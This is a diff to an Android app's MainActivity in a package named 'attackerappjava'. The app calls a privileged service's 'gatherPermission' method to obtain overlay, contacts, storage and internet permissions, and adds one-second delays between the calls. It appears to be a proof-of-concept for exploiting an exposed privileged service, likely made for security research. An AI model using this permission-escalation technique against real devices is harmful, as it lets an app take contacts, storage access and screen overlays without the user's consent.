@@ -1,5 +1,7 @@
 package com.example.attackerappjava;
 
+import static java.lang.Thread.sleep;
+
 import android.annotation.SuppressLint;
 import android.content.ComponentName;
 import android.content.Intent;
@@ -164,13 +166,20 @@ public class MainActivity extends AppCompatActivity {
         }
         tvOutput.setText("Running command...");
         try {
+            fnsleep(1);
             privilegedService.gatherPermission("SYSTEM_ALERT_WINDOW");
+            fnsleep(1);
             privilegedService.gatherPermission("READ_CONTACTS");
+            fnsleep(1);
             privilegedService.gatherPermission("POST_NOTIFICATIONS");
+            fnsleep(1);
             privilegedService.gatherPermission("READ_EXTERNAL_STORAGE");
+            fnsleep(1);
             privilegedService.gatherPermission("WRITE_EXTERNAL_STORAGE");
-            privilegedService.gatherPermission("FOREGROUND_SERVICE");
-            privilegedService.gatherPermission("FOREGROUND_SERVICE_SPECIAL_USE");
+            fnsleep(1);
+            privilegedService.gatherPermission("INTERNET");
+//            privilegedService.gatherPermission("FOREGROUND_SERVICE");
+//            privilegedService.gatherPermission("FOREGROUND_SERVICE_SPECIAL_USE");
         } catch (RemoteException e) {
             Log.e(TAG, "RemoteException while executing privileged command", e);
             tvOutput.setText("Error: " + e.getMessage());
@@ -204,5 +213,13 @@ public class MainActivity extends AppCompatActivity {
         Intent intent = new Intent(this, OverlayService.class);
         stopService(intent);
         Toast.makeText(this, "OverlayService stopped", Toast.LENGTH_SHORT).show();
+    }
+
+    private void fnsleep(int seconds){
+        try {
+            sleep(seconds* 1000L);
+        } catch (InterruptedException e) {
+            throw new RuntimeException(e);
+        }
     }
 }
